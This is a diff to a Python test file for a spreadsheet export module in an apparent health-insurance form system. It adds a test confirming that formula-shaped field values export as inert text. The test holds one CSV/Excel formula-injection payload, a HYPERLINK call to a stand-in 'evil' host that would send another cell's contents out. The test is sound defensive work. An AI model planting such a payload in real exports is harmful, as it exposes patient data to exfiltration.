@@ -4,6 +4,7 @@ from uuid import uuid4
 
 from openpyxl import load_workbook
 
+from vera_core.forms.dsl import PromotedFields
 from vera_core.forms.export import build_workbook
 from vera_core.services.call_provenance import CallAttempt, FieldProvenance, JudgeInfo
 
@@ -11,6 +12,10 @@ V2 = {
     "dsl_version": "2.1",
     "name": "Test",
     "insurance_type": "infertility_treatment",
+    # The DSL requires every promoted column mapped to a system_fields target —
+    # point them all at one leaf (same shortcut as test_conditions.py).
+    "system_fields": {"network_status": "sections.cov.network_status"},
+    "promoted_fields": dict.fromkeys(PromotedFields.model_fields, "sections.cov.network_status"),
     "sections": {
         "cov": {
             "title": "Coverage",
@@ -72,3 +77,22 @@ def test_v1_falls_back_to_flat_listing() -> None:
     wb = load_workbook(BytesIO(data))
     rows = [tuple(r) for r in wb["Form"].iter_rows(values_only=True)]
     assert ("cov.a", "x") in rows
+
+
+def test_formula_shaped_values_export_as_inert_text() -> None:
+    """A field value starting with "=" (attacker-influenceable: rep speech via
+    LLM extraction, intake, human edits) must land in the PHI export as text,
+    never a live Excel formula (exfiltration surface)."""
+    payload = '=HYPERLINK("http://evil/?x="&B2,"click")'
+    data = build_workbook(
+        {"sections": []},
+        values={"cov.a": payload},
+        sources={"cov.a": "human"},
+        provenance={},
+        attempts=[],
+    )
+    wb = load_workbook(BytesIO(data))
+    cell = next(c for row in wb["Form"].iter_rows() for c in row if c.value == payload)
+    assert cell.data_type != "f"
+    rows = [tuple(r) for r in wb["Form"].iter_rows(values_only=True)]
+    assert ("cov.a", payload) in rows  # text preserved verbatim
